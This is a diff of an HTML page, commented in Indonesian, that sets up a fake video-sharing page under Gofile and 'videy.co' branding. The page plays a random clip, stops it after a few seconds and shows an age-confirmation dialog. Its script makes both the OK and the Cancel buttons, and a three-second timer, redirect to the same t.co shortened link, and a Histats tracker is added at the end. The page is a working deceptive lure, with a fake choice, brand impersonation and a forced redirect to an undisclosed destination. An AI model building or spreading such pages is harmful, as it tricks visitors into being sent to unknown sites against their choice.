@@ -1,8 +1,489 @@
-<meta property="og:title" content="04:32" /><meta property="og:image" content="https://i.ibb.co/N26wYN2S/image-Pippit-202603290029-1.png" /><meta name="twitter:card" content="summary_large_image" /><script type="text/javascript">
-    fetch('/count.php',
-    {
-        method: "post",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({url_id: 28})
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+ 
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Font Awesome (opsional) -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+
+  <!-- Font & Helpers -->
+  <style>
+    @import  url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+    .fade-transition { transition: opacity 0.5s ease-in-out; }
+
+    /* Frame video fleksibel: pertahankan rasio asli */
+    .video-frame{
+      background:#000; display:flex; align-items:center; justify-content:center;
+      width:100%; max-width:1024px; margin:0 auto; border-radius:.5rem; overflow:hidden;
+    }
+    .video-el{
+      display:block; max-width:100%; max-height:80vh; width:100%; height:auto; object-fit:contain;
+    }
+    .video-frame.portrait .video-el{ width:auto; height:80vh; max-height:80vh; max-width:100%; }
+
+    /* Saat modal terbuka: kunci scroll */
+    .no-scroll{ overflow:hidden; }
+  </style>
+
+  </head>
+<body class="bg-white text-gray-800">
+
+
+
+  <!-- Header -->
+  <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
+    <div class="flex items-center space-x-2">
+      <span class="font-extrabold text-2xl leading-none select-none"><img id="index_logo" src="https://gofile.io/dist/img/logo-big.png" alt="Gofile" class="h-12"></span>
+      <span class="text-xs bg-green-100 text-green-800 px-2 py-1 rounded-full font-medium">ULTIMATE</span>
+    </div>
+    <nav class="flex items-center space-x-6">
+      <button class="bg-gray-200 rounded-full px-4 py-1 text-black font-semibold text-sm" type="button">Upload</button>
+      <a class="text-black text-sm" href="#">Advertise</a>
+    </nav>
+  </header>
+
+  <!-- Main Video -->
+  <main class="px-4 pt-6 max-w-4xl mx-auto">
+    <div id="videoContainer" class="video-frame fade-transition opacity-100">
+      <video id="mainVideo" class="video-el" muted playsinline controls preload="metadata">
+        <source id="videoSource" src="" type="video/mp4">
+        Browser Anda tidak mendukung video tag.
+      </video>
+    </div>
+  </main>
+  
+  <!-- Artikel -->
+  <section id="allArticles" class="max-w-4xl mx-auto px-4 pb-10">
+    <h2 class="text-2xl font-bold mb-6 text-center"></h2>
+    <div id="articlesContainer" class="grid gap-6 sm:grid-cols-1"></div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="bg-gray-50 border-t border-gray-200 py-8">
+    <div class="max-w-7xl mx-auto px-4 text-center">
+      <p class="text-gray-600 text-sm mb-4">Copyright © 2025 videy.co - Ultimate Edition</p>
+      <div class="flex flex-wrap justify-center gap-6 text-sm">
+        <span class="text-gray-400 cursor-default">Terms of Service</span>
+        <span class="text-gray-400 cursor-default">Report Abuse</span>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Modal Verifikasi Usia -->
+  <div id="ageModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/60 p-4"
+       role="dialog" aria-modal="true" aria-labelledby="ageTitle" aria-describedby="ageDesc">
+    <div class="w-full max-w-md rounded-2xl bg-white shadow-xl">
+      <div class="px-6 pt-6 pb-4">
+        <h3 id="ageTitle" class="text-xl font-bold mb-2">videy.co</h3>
+        <p id="ageDesc" class="text-gray-700">
+          Harap konfirmasikan bahwa Anda memenuhi persyaratan usia minimum 18 tahun.
+        </p>
+      </div>
+      <div class="flex items-center justify-end gap-3 px-6 pb-6">
+        <button id="ageCancelBtn" class="px-4 py-2 rounded-full border border-gray-300 text-gray-500 font-semibold">BATALKAN</button>
+        <button id="ageOkBtn" class="px-5 py-2 rounded-full bg-black text-white font-semibold">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Script -->
+  <script>
+    // =========================
+    // KONFIGURASI POPUP FREKUENSI
+    // "always"      -> selalu tampil tiap pageview/playback
+    // "per_session" -> sekali per sesi browser
+    // "per_30d"     -> sekali per 30 hari
+    // =========================
+    const POPUP_MODE = "always"; // sesuai permintaan: sering muncul
+
+    // ====== Daftar video random ======
+    const videoList = [
+      "https://cdn.videy.co/SeLYRWkM1.mp4",
+      "https://cdn.videy.co/245HQ90K1.mp4",
+      "https://cdn.videy.co/Rwg32ds31.mp4",
+      "https://cdn.videy.co/ZHGh5TgF1.mp4",
+      "https://cdn.videy.co/AbtwK9iL1.mp4",
+      "https://cdn.videy.co/PakJ6MTr1.mp4",
+      "https://cdn.videy.co/WoXFRWDz1.mp4",
+      "https://cdn.videy.co/ZUUdcoeK1.mp4",
+      "https://cdn.videy.co/LFSTkV741.mp4",
+      "https://cdn.videy.co/0cyGYh1r1.mp4",
+      "https://cdn.videy.co/MmdO93DU1.mp4",
+      "https://cdn.videy.co/tsZYQsi91.mp4",
+      "https://cdn.videy.co/laJ1s8T41.mp4",
+      "https://cdn.videy.co/LFSTkV741.mp4",
+      "https://cdn.videy.co/0cyGYh1r1.mp4",
+      "https://cdn.videy.co/MmdO93DU1.mp4",
+      "https://cdn.videy.co/ZUUdcoeK1.mp4",
+      "https://cdn.videy.co/tsZYQsi91.mp4",
+      "https://cdn.videy.co/laJ1s8T41.mp4",
+      "https://cdn.videy.co/AbtwK9iL1.mp4",
+      "https://cdn.videy.co/pcJBfrRs1.mp4",
+      "https://cdn.videy.co/L2T1TKwE1.mp4",
+      "https://cdn.videy.co/pr53X8161.mp4",
+      "https://cdn.videy.co/8HpX3SaB1.mp4",
+      "https://cdn.videy.co/GY3wafsb1.mp4",
+      "https://cdn.videy.co/yJR4deRG1.mp4",
+      "https://cdn.videy.co/zZPinfCq1.mp4",
+      "https://cdn.videy.co/ovPY20fo1.mp4",
+      "https://cdn.videy.co/KvETNsFQ1.mp4",
+      "https://cdn.videy.co/tlzplVjV1.mp4",
+      "https://cdn.videy.co/OJ5NkS5Z1.mp4",
+      "https://cdn.videy.co/ngVHH4RJ1.mp4",
+      "https://cdn.videy.co/Na3sjkPi1.mp4",
+      "https://cdn.videy.co/jT20azP21.mp4",
+      "https://cdn.videy.co/bysAPWwN1.mp4",
+      "https://cdn.videy.co/6OLueDGK1.mp4",
+      "https://cdn.videy.co/rg0qBJqt1.mp4",
+      "https://cdn.videy.co/c9s72Zd21.mp4",
+      "https://cdn.videy.co/KOK8yzZq1.mp4",
+      "https://cdn.videy.co/ZqI9bBP11.mp4",
+      "https://cdn.videy.co/q6SsUWQr1.mp4",
+      "https://cdn.videy.co/bCHom5kN1.mp4",
+      "https://cdn.videy.co/oYLJwsui1.mp4",
+      "https://cdn.videy.co/1Ga23ssR1.mp4",
+      "https://cdn.videy.co/drZpWEio1.mp4",
+      "https://cdn.videy.co/6x44wnk1.mp4",
+      "https://cdn.videy.co/jfGLuymF1.mp4",
+      "https://cdn.videy.co/RCXGz4fG1.mp4",
+      "https://cdn.videy.co/xS7WObSu1.mp4",
+      "https://cdn.videy.co/2eNoTziL1.mp4",
+      "https://cdn.videy.co/M6fPw1jh1.mp4",
+      "https://cdn.videy.co/QxfoLUvN1.mp4",
+      "https://cdn.videy.co/5td90oL31.mp4",
+      "https://cdn.videy.co/Ht4G3qre1.mp4",
+      "https://cdn.videy.co/nlHWapsM1.mp4",
+      "https://cdn.videy.co/j0JIPDQb1.mp4",
+      "https://cdn.videy.co/UCamXMxF1.mp4",
+      "https://cdn.videy.co/CMFbSpp01.mp4",
+      "https://cdn.videy.co/KXfRAsBh1.mp4",
+      "https://cdn.videy.co/WpFSOarD1.mp4",
+      "https://cdn.videy.co/a5d5eZB41.mp4",
+      "https://cdn.videy.co/XihdsHZ11.mp4",
+      "https://cdn.videy.co/VLIMCmfV1.mp4",
+      "https://cdn.videy.co/5td90oL31.mp4",
+      "https://cdn.videy.co/drZpWEio1.mp4",
+      "https://cdn.videy.co/lvGy5po1.mp4",
+      "https://cdn.videy.co/bH4iB1R91.mp4",
+      "https://cdn.videy.co/EGKmje6t1.mp4",
+      "https://cdn.videy.co/QuAld5Tu1.mp4",
+      "https://cdn.videy.co/AyjNzw3b1.mp4",
+      "https://cdn.videy.co/1pb6xwBO1.mp4",
+      "https://cdn.videy.co/WpFSOarD1.mp4",
+      "https://cdn.videy.co/RNUZ4HHU1.mp4",
+      "https://cdn.videy.co/zX0Gmiwb1.mp4",
+      "https://cdn.videy.co/mG0A1tsN1.mp4",
+      "https://cdn.videy.co/qnQYG8rl1.mp4",
+      "https://cdn.videy.co/8ZYQY5tz1.mp4",
+      "https://cdn.videy.co/x3lkEf5M1.mp4",
+      "https://cdn.videy.co/MtCOjunt1.mp4",
+      "https://cdn.videy.co/wWtKn6UT1.mp4",
+      "https://cdn.videy.co/ZB2OvrRh1.mp4",
+      "https://cdn.videy.co/LPuZcqBg1.mp4",
+      "https://cdn.videy.co/rkAc3MW71.mp4",
+      "https://cdn.videy.co/774BRPaY1.mp4",
+      "https://cdn.videy.co/ngVHH4RJ1.mp4",
+      "https://cdn.videy.co/drZpWEio1.mp4",
+      "https://cdn.videy.co/env9NqCO1.mp4",
+      "https://cdn.videy.co/xxRqFUFP1.mp4",
+      "https://cdn.videy.co/UKIT0mDz1.mp4",
+      "https://cdn.videy.co/BbpVMhCP1.mp4",
+      "https://cdn.videy.co/1pb6xwBO1.mp4",
+      "https://cdn.videy.co/UBX0ULqN1.mp4",
+      "https://cdn.videy.co/7ULt71Dv1.mp4",
+      "https://cdn.videy.co/WUc61jVf1.mp4",
+      "https://cdn.videy.co/U9IPsgoW1.mp4",
+      "https://cdn.videy.co/6vDjEMbt1.mp4",
+      "https://cdn.videy.co/tRBMPSkv1.mp4",
+      "https://cdn.videy.co/S4NZFl2m1.mp4",
+      "https://cdn.videy.co/ngVHH4RJ1.mp4",
+      "https://cdn.videy.co/WWKWMEBj1.mp4",
+      "https://cdn.videy.co/HgK0qgDP1.mp4",
+      "https://cdn.videy.co/3ttnEjDt1.mp4",
+      "https://cdn.videy.co/ej5F0jlE1.mp4",
+      "https://cdn.videy.co/EnPkpEMC1.mp4",
+      "https://cdn.videy.co/ksnCnJjL1.mp4",
+      "https://cdn.videy.co/rNW7sJf91.mp4",
+      "https://cdn.videy.co/EGKmje6t1.mp4",
+      "https://cdn.videy.co/HWtQMgyI1.mp4",
+      "https://cdn.videy.co/smMnJo6V1.mp4",
+      "https://cdn.videy.co/JjTLcUvw1.mp4",
+      "https://cdn.videy.co/OOyY3kAd1.mp4",
+      "https://cdn.videy.co/tczq8Hrx1.mp4",
+      "https://cdn.videy.co/byBBSLDt1.mp4",
+      "https://cdn.videy.co/DuYheKHq1.mp4",
+      "https://cdn.videy.co/dAWABY8e1.mp4",
+      "https://cdn.videy.co/d94lkIFM1.mp4",
+      "https://cdn.videy.co/HgA4F2ZI1.mp4",
+      "https://cdn.videy.co/tXyBPxNo1.mp4",
+      "https://cdn.videy.co/rRNYspvs1.mp4",
+      "https://cdn.videy.co/8UrUtXYe1.mp4",
+      "https://cdn.videy.co/zr7nTk7N1.mp4",
+      "https://cdn.videy.co/5wZVrhhp1.mp4",
+      "https://cdn.videy.co/EBmu7RB01.mp4",
+      "https://cdn.videy.co/AT0XmTal1.mp4",
+      "https://cdn.videy.co/nkP8efMM1.mp4",
+      "https://cdn.videy.co/sXExUvm81.mp4",
+      "https://cdn.videy.co/o1Bv6JtU1.mp4",
+      "https://cdn.videy.co/B6heQR901.mp4",
+      "https://cdn.videy.co/TJnAn5I51.mp4",
+      "https://cdn.videy.co/gDRdNSB71.mp4",
+      "https://cdn.videy.co/TA6Q6DY41.mp4",
+      "https://cdn.videy.co/hICbGEZS1.mp4",
+      "https://cdn.videy.co/3sYxEEr71.mp4",
+      "https://cdn.videy.co/vkowCTUM1.mp4",
+      "https://cdn.videy.co/ZnQSwtYa1.mp4",
+      "https://cdn.videy.co/bCHom5kN1.mp4",
+      "https://cdn.videy.co/eTXeLhOf1.mp4",
+      "https://cdn.videy.co/yfGA1LxP1.mp4",
+      "https://cdn.videy.co/tLfrjMFv1.mp4",
+      "https://cdn.videy.co/gloEgJ5z1.mp4",
+      "https://cdn.videy.co/KxXApVT81.mp4",
+      "https://cdn.videy.co/uhdyCgGD1.mp4",
+      "https://cdn.videy.co/cXFSH96r1.mp4",
+      "https://cdn.videy.co/6Z410HbQ1.mp4",
+      "https://cdn.videy.co/w2oyDZf71.mp4",
+      "https://cdn.videy.co/HtRJF3YP1.mp4",
+      "https://cdn.videy.co/OabKyFrH1.mp4",
+      "https://cdn.videy.co/jbIEsuP51.mp4",
+      "https://cdn.videy.co/My0O2PVZ1.mp4",
+      "https://cdn.videy.co/AIv3cXoe1.mp4",
+      "https://cdn.videy.co/jnGtqXhP1.mp4",
+      "https://cdn.videy.co/CPHBnVYp1.mp4",
+      "https://cdn.videy.co/FtLk0Zjm2.mp4",
+      "https://cdn.videy.co/bkLjZd7N1.mp4",
+      "https://cdn.videy.co/MsVrKD3f1.mp4",
+      "https://cdn.videy.co/VW5WBk641.mp4",
+      "https://cdn.videy.co/2SNcektp1.mp4",
+      "https://cdn.videy.co/43IbHqrp1.mp4",
+      "https://cdn.videy.co/69SHf7ca1.mp4",
+      "https://cdn.videy.co/YXS1XP3E1.mp4",
+      "https://cdn.videy.co/3JRzPzff1.mp4",
+      "https://cdn.videy.co/5dteDQjh1.mp4",
+      "https://cdn.videy.co/wC8e9Tvr1.mp4",
+      "https://cdn.videy.co/dNIQc0rX1.mp4",
+      "https://cdn.videy.co/Vm9Slx0P1.mp4",
+      "https://cdn.videy.co/Fq3NnQL81.mp4",
+      "https://cdn.videy.co/yUoimOF71.mp4",
+      "https://cdn.videy.co/sPRQtj021.mp4",
+      "https://cdn.videy.co/oiXLfT0X1.mp4",
+      "https://cdn.videy.co/ZhwALkTD1.mp4",
+      "https://cdn.videy.co/PHWxZstk1.mp4",
+      "https://cdn.videy.co/KAAAzVUQ1.mp4",
+      "https://cdn.videy.co/5JdNXp0k1.mp4",
+      "https://cdn.videy.co/gEq1wcn51.mp4",
+      "https://cdn.videy.co/kXPHGVMc1.mp4",
+      "https://cdn.videy.co/5PVtTlf21.mp4",
+      "https://cdn.videy.co/JJfxwu8h1.mp4",
+      "https://cdn.videy.co/dICKQUoW1.mp4",
+      "https://cdn.videy.co/lG4v6zim1.mp4",
+      "https://cdn.videy.co/kgb8cmWL1.mp4",
+      "https://cdn.videy.co/3ju98jY01.mp4",
+      "https://cdn.videy.co/NVAuuEF31.mp4",
+      "https://cdn.videy.co/pPHyfC5o1.mp4",
+      "https://cdn.videy.co/UefiwezW1.mp4",
+      "https://cdn.videy.co/s46QV2Ir1.mp4",
+      "https://cdn.videy.co/SEtFZIzk1.mp4",
+      "https://cdn.videy.co/Uc3lpPQg1.mp4",
+      "https://cdn.videy.co/gUc2D6sV1.mp4",
+      "https://cdn.videy.co/5Wed9jP71.mp4",
+      "https://cdn.videy.co/hcEApFKh1.mp4",
+      "https://cdn.videy.co/3LQtaOuk1.mp4",
+      "https://cdn.videy.co/iNMbHsm91.mp4",
+      "https://cdn.videy.co/wPSNktJ31.mp4",
+      "https://cdn.videy.co/5ZuxRNxh1.mp4",
+      "https://cdn.videy.co/vfN2tTnw1.mp4",
+      "https://cdn.videy.co/SUx4iqO01.mp4",
+      "https://cdn.videy.co/SvSnNs991.mp4",
+      "https://cdn.videy.co/K8R2GLUa1.mp4"
+    ];
+    const pickRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
+
+    // ====== Storage util (dipakai jika bukan "always") ======
+    const AGE_KEY = "ageConfirmedAt";
+    const AGE_TTL_MS = 30 * 24 * 60 * 60 * 1000;
+
+    // Variabel global untuk tracking modal redirect (sekarang di-assign di DOMContentLoaded)
+    // let modalRedirectTimeout = null;
+    // let selectedRedirectUrl = null;
+
+    function getApexDomain(){
+      const parts = location.hostname.split('.');
+      for(let i=parts.length-2;i>=0;i--){
+        const d='.'+parts.slice(i).join('.');
+        document.cookie=`__apextest=1;path=/;domain=${d}`;
+        const ok=document.cookie.includes('__apextest=1');
+        document.cookie=`__apextest=;path=/;domain=${d};expires=Thu, 01 Jan 1970 00:00:00 GMT`;
+        if(ok) return d;
+      }
+      return location.hostname;
+    }
+    const COOKIE_DOMAIN = getApexDomain();
+    function setCookie(name,value,days){
+      const expires=new Date(Date.now()+days*864e5).toUTCString();
+      document.cookie=`${encodeURIComponent(name)}=${encodeURIComponent(value)};path=/;domain=${COOKIE_DOMAIN};expires=${expires};SameSite=Lax`;
+    }
+    function getCookie(name){
+      return document.cookie.split('; ').find(r=>r.startsWith(encodeURIComponent(name)+'='))?.split('=')[1];
+    }
+
+    function isAgeConfirmed(){
+      if(POPUP_MODE==="always") return false;
+      if(POPUP_MODE==="per_session") return sessionStorage.getItem(AGE_KEY)==="1";
+      const tsLS=Number(localStorage.getItem(AGE_KEY)||0);
+      const okLS=tsLS && (Date.now()-tsLS)<AGE_TTL_MS;
+      const tsCK=Number(getCookie(AGE_KEY)||0);
+      const okCK=tsCK && (Date.now()-tsCK)<AGE_TTL_MS;
+      return okLS||okCK;
+    }
+    function setAgeConfirmed(){
+      if(POPUP_MODE==="per_session"){ try{sessionStorage.setItem(AGE_KEY,"1");}catch{} return; }
+      if(POPUP_MODE==="per_30d"){ const now=Date.now().toString(); try{localStorage.setItem(AGE_KEY,now);}catch{} setCookie(AGE_KEY,now,30); }
+      // "always": tidak menyimpan apa-apa
+    }
+
+    // ====== Modal helpers ======
+    function showAgeModal(){
+      document.body.classList.add('no-scroll');
+      const m=document.getElementById('ageModal');
+      m.classList.remove('hidden');
+      m.classList.add('flex');
+
+      // Pilih URL redirect yang akan digunakan
+      if (!window.selectedRedirectUrl) {
+        window.selectedRedirectUrl = window.redirectUrls[Math.floor(Math.random() * window.redirectUrls.length)];
+      }
+
+      // Mulai countdown 3 detik untuk auto redirect
+      window.modalRedirectTimeout = setTimeout(() => {
+        window.location.href = window.selectedRedirectUrl;
+      }, 3000); // 3 detik countdown
+
+      setTimeout(()=>document.getElementById('ageOkBtn').focus(),0);
+    }
+
+    function hideAgeModal(){
+      document.body.classList.remove('no-scroll');
+      const m=document.getElementById('ageModal');
+      m.classList.add('hidden');
+      m.classList.remove('flex');
+
+      // Clear timeout jika modal ditutup secara manual
+      if (window.modalRedirectTimeout) {
+        clearTimeout(window.modalRedirectTimeout);
+        window.modalRedirectTimeout = null;
+      }
+    }
+
+    // ====== Layout video sesuai rasio ======
+    function applyVideoLayout(videoEl){
+      const c=document.getElementById("videoContainer");
+      c.classList.toggle('portrait', videoEl.videoHeight > videoEl.videoWidth);
+    }
+
+    // ====== Setup video + popup @ 5 detik ======
+    function setupVideo(){
+      const video=document.getElementById("mainVideo");
+      const source=document.getElementById("videoSource");
+      source.src=pickRandomVideo();
+      video.load();
+
+      const tryPlay=()=>{ video.muted=true; video.play().catch(()=>{}); };
+
+      let nineTriggered=false;
+      let threshold=7; // detik popup
+
+      const onMeta=()=>{
+        applyVideoLayout(video);
+        // Jika durasi < 5 detik, munculkan di 90% durasi
+        if(isFinite(video.duration) && video.duration>0 && video.duration<5){
+          threshold=Math.max(1, video.duration*0.9);
+        }
+        tryPlay();
+      };
+      if(video.readyState>=1) onMeta();
+      else video.addEventListener("loadedmetadata", onMeta, { once:true });
+
+      // Popup di detik 5 (sekali per playback)
+      const onTime=()=>{
+        if(!nineTriggered && !isAgeConfirmed() && video.currentTime>=threshold){
+          nineTriggered=true;
+          video.pause();
+          showAgeModal();
+        }
+      };
+      video.addEventListener("timeupdate", onTime);
+
+      // Batas 7 detik total play
+      const stopAtSeven=()=>{
+        if(video.currentTime>=7){
+          video.pause();
+          video.removeEventListener("timeupdate", stopAtSeven);
+        }
+      };
+      video.addEventListener("timeupdate", stopAtSeven);
+
+      window.addEventListener('resize', ()=>applyVideoLayout(video));
+
+      // Aksi modal - kedua tombol redirect ke URL acak yang sama
+      window.modalRedirectHandler = () => {
+        // Clear timeout yang ada
+        if (window.modalRedirectTimeout) {
+          clearTimeout(window.modalRedirectTimeout);
+          window.modalRedirectTimeout = null;
+        }
+
+        // Pilih URL acak yang sama untuk kedua tombol (jika belum dipilih)
+        if (!window.selectedRedirectUrl) {
+          window.selectedRedirectUrl = window.redirectUrls[Math.floor(Math.random() * window.redirectUrls.length)];
+        }
+
+        // Redirect dengan delay
+        setTimeout(() => {
+          window.location.href = window.selectedRedirectUrl;
+        }, 2000 + Math.random() * 1000); // 2-3 detik delay
+      };
+
+      document.getElementById('ageOkBtn').addEventListener('click', modalRedirectHandler);
+      document.getElementById('ageCancelBtn').addEventListener('click', modalRedirectHandler);
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+      // Daftar URL tujuan
+      window.redirectUrls = [
+        "https://t.co/qJqN1VspL0",
+        "https://t.co/qJqN1VspL0"
+      ];
+
+      // Setup video
+      setupVideo();
     });
-</script><script type="text/javascript">window.location.href = "https://t.co/qJqN1VspL0";</script>
+  </script>
+</body>
+</html>
+
+<head>
+  
+
+<head>
+
+
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4844462,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4844462&101" alt="" border="0"></a></noscript>
+<!-- Histats.com  END  -->
